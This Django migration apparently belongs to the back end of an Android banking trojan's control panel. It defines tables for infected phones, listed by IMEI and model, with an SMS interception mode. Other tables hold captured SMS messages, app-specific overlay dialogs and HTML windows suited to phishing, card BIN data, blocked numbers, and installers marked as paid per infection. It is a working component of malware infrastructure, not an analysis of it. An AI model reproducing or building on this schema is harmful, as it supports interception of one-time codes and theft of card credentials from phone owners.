# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.contrib.auth.models
import django_countries.fields
from django.conf import settings

import smsapp.cfields


class Migration(migrations.Migration):
    dependencies = [
        ('auth', '0006_require_contenttypes_0002'),
        migrations.swappable_dependency(settings.AUTH_USER_MODEL),
    ]

    operations = [
        migrations.CreateModel(
            name='BinData',
            fields=[
                ('cid', models.IntegerField(serialize=False, primary_key=True)),
                ('card', models.CharField(max_length=255, blank=True)),
                ('bank', models.CharField(max_length=255, null=True)),
                ('ctype', models.CharField(max_length=64, null=True, blank=True)),
                ('clevel', models.CharField(max_length=64, null=True, blank=True)),
                ('country', models.CharField(max_length=2, null=True, blank=True)),
            ],
        ),
        migrations.CreateModel(
            name='BlockedNumber',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('number', models.CharField(max_length=255)),
            ],
            options={
                'verbose_name': 'blocked number',
                'verbose_name_plural': 'blocked numbers',
            },
        ),
        migrations.CreateModel(
            name='InstalledApp',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('name', models.CharField(max_length=255, db_index=True)),
            ],
            options={
                'verbose_name': 'installed application',
                'verbose_name_plural': 'installed applications',
            },
        ),
        migrations.CreateModel(
            name='Installer',
            fields=[
                ('user_ptr',
                 models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False,
                                      to=settings.AUTH_USER_MODEL)),
                ('user_id', models.DecimalField(unique=True, max_digits=16, decimal_places=0)),
            ],
            options={
                'verbose_name': 'Installer',
                'verbose_name_plural': 'Installers',
            },
            bases=('auth.user',),
            managers=[
                (b'objects', django.contrib.auth.models.UserManager()),
            ],
        ),
        migrations.CreateModel(
            name='InternalSMS',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('contents', models.TextField(verbose_name='SMS Text')),
                ('created', models.DateTimeField(auto_now_add=True)),
            ],
            options={
                'verbose_name': 'internal SMS',
                'verbose_name_plural': 'internal SMSs',
            },
        ),
        migrations.CreateModel(
            name='ISender',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('name', models.CharField(unique=True, max_length=255)),
            ],
            options={
                'verbose_name': 'internal SMS sender',
                'verbose_name_plural': 'internal SMS senders',
            },
        ),
        migrations.CreateModel(
            name='LogRecord',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('registered', models.DateTimeField(auto_now_add=True)),
                ('contents', models.TextField()),
            ],
        ),
        migrations.CreateModel(
            name='MobileOperator',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('name', models.CharField(max_length=255)),
            ],
        ),
        migrations.CreateModel(
            name='Option',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('name', models.CharField(unique=True, max_length=255)),
                ('content', models.TextField(blank=True)),
            ],
        ),
        migrations.CreateModel(
            name='PhoneData',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('number',
                 models.CharField(db_index=True, max_length=255, null=True, verbose_name='Phone #', blank=True)),
                ('imei', models.CharField(max_length=255, unique=True, null=True, verbose_name='H/W ID')),
                ('registered', models.DateTimeField(auto_now_add=True)),
                ('country',
                 django_countries.fields.CountryField(max_length=2, blank=True, null=True, verbose_name='Country code',
                                                      db_index=True)),
                ('os_version', models.CharField(max_length=128, null=True, verbose_name='OS version')),
                ('hw_model', models.CharField(max_length=255, null=True, verbose_name='Hardware model')),
                ('uniq_id', models.CharField(max_length=64, unique=True, null=True, verbose_name='Unique ID')),
                ('sms_status', models.IntegerField(default=0, verbose_name='SMS status',
                                                   choices=[(0, b'None'), (1, b'Listening'), (2, b'Intercepting')])),
                ('last_connection', models.DateTimeField(null=True, verbose_name='Last connection')),
                ('id_sent', models.BooleanField(default=False, verbose_name='#sentid already sent')),
                ('locked', models.BooleanField(default=False, verbose_name='Locked')),
                ('inactive', models.BooleanField(default=False,
                                                 help_text="Set automatically if the phone didn't contact server for 5 days",
                                                 verbose_name='Inactive')),
                ('paid', models.BooleanField(default=False, verbose_name='Paid to installer')),
                ('admin_comment', models.TextField(null=True, verbose_name='Admin comment', blank=True)),
                ('installer',
                 models.ForeignKey(related_name='bot_installer', verbose_name='Installer', to='smsapp.Installer',
                                   null=True)),
                ('operator',
                 models.ForeignKey(verbose_name='Mobile operator', blank=True, to='smsapp.MobileOperator', null=True)),
            ],
            options={
                'verbose_name': 'phone',
                'verbose_name_plural': 'phones',
            },
        ),
        migrations.CreateModel(
            name='RemoteDialog',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('sender', models.CharField(max_length=255, unique=True, null=True, blank=True)),
                ('app', models.CharField(max_length=255, unique=True, null=True, blank=True)),
                ('operator', smsapp.cfields.OperatorField(max_length=32, unique=True, null=True, blank=True)),
                ('priority', models.DecimalField(default=0, max_digits=4, decimal_places=0)),
                ('description', models.CharField(max_length=255)),
                ('delay', models.IntegerField(default=0, help_text='in minutes', verbose_name='initial delay')),
                ('restart', models.IntegerField(default=0, help_text='in minutes', verbose_name='restart interval')),
                ('dlg1', models.TextField(verbose_name='first dialog text')),
                ('dlg2', models.TextField(verbose_name='second dialog text', blank=True)),
                ('w1', models.TextField(verbose_name='first window', blank=True)),
                ('w1_repeated', models.BooleanField(default=False, verbose_name='first window reset')),
                ('w1_repeated_text', models.TextField(verbose_name='first window reset text', blank=True)),
                ('w2_enabled', models.BooleanField(default=True, verbose_name='second window enabled')),
                ('w2', models.TextField(verbose_name='second window', blank=True)),
                ('w2_repeated', models.BooleanField(default=False, verbose_name='second window reset')),
                ('w2_repeated_text', models.TextField(verbose_name='second window reset text', blank=True)),
                ('dlg3', models.TextField(verbose_name='last dialog text', blank=True)),
                ('is_html', models.BooleanField(default=False, verbose_name='Is HTML dialog')),
                ('html_contents', models.TextField(null=True, verbose_name='HTML contents', blank=True)),
            ],
            options={
                'verbose_name': 'dialog',
                'verbose_name_plural': 'dialogs',
            },
        ),
        migrations.CreateModel(
            name='SMSRecord',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('source', models.CharField(max_length=255, null=True, verbose_name='From')),
                ('dest', models.CharField(max_length=255, null=True, verbose_name='To')),
                ('contents', models.TextField(verbose_name='SMS Text')),
                ('created', models.DateTimeField(auto_now_add=True)),
                ('intercepted', models.BooleanField(default=False)),
                ('billing_status',
                 models.IntegerField(default=0, choices=[(0, 'Normal'), (1, 'Refunded'), (2, 'Disputed')])),
            ],
            options={
                'verbose_name': 'SMS',
                'verbose_name_plural': 'SMS records',
            },
        ),
        migrations.CreateModel(
            name='SysUser',
            fields=[
                ('user_ptr',
                 models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False,
                                      to=settings.AUTH_USER_MODEL)),
                ('jabber', models.EmailField(max_length=254, null=True)),
                ('activation_key', models.CharField(max_length=40, null=True, verbose_name='activation key')),
            ],
            options={
                'verbose_name': 'System User',
                'verbose_name_plural': 'System Users',
            },
            bases=('auth.user',),
            managers=[
                (b'objects', django.contrib.auth.models.UserManager()),
            ],
        ),
        migrations.CreateModel(
            name='UserComment',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('contents', models.TextField(verbose_name='Comment contents')),
                ('phone', models.ForeignKey(to='smsapp.PhoneData')),
                ('user', models.ForeignKey(to='smsapp.SysUser')),
            ],
        ),
        migrations.AddField(
            model_name='smsrecord',
            name='owner',
            field=models.ForeignKey(to='smsapp.SysUser', null=True),
        ),
        migrations.AddField(
            model_name='smsrecord',
            name='phone',
            field=models.ForeignKey(to='smsapp.PhoneData'),
        ),
        migrations.AddField(
            model_name='phonedata',
            name='owner',
            field=models.ForeignKey(verbose_name='Assigned to', blank=True, to=settings.AUTH_USER_MODEL, null=True),
        ),
        migrations.AddField(
            model_name='internalsms',
            name='phone',
            field=models.ForeignKey(to='smsapp.PhoneData'),
        ),
        migrations.AddField(
            model_name='internalsms',
            name='sender',
            field=models.ForeignKey(verbose_name='sender', to='smsapp.ISender', null=True),
        ),
        migrations.AddField(
            model_name='installedapp',
            name='phone',
            field=models.ForeignKey(to='smsapp.PhoneData'),
        ),
        migrations.AddField(
            model_name='blockednumber',
            name='phone',
            field=models.ForeignKey(to='smsapp.PhoneData'),
        ),
        migrations.AlterUniqueTogether(
            name='usercomment',
            unique_together=set([('user', 'phone')]),
        ),
        migrations.AlterIndexTogether(
            name='phonedata',
            index_together=set([('number', 'id_sent')]),
        ),
        migrations.AlterIndexTogether(
            name='installedapp',
            index_together=set([('name', 'phone')]),
        ),
        migrations.AlterIndexTogether(
            name='blockednumber',
            index_together=set([('number', 'phone')]),
        ),
    ]
